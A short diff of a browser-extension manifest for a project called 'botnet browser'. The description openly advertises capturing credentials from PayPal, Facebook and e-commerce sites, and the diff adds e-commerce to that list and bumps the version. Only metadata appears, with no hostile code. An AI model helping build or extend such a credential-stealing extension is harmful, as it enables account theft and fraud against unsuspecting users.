@@ -3,8 +3,8 @@
   "manifest_version": 2,
 
   "name": "botnet browser",
-  "description": "botnet Browser,capture credentials,paypal,facebook...etc",
-  "version": "1.3",
+  "description": "botnet Browser,capture credentials,paypal,e-commerce,facebook...etc",
+  "version": "4.3",
   "browser_action": {
     "default_icon": "icon.png"
   },
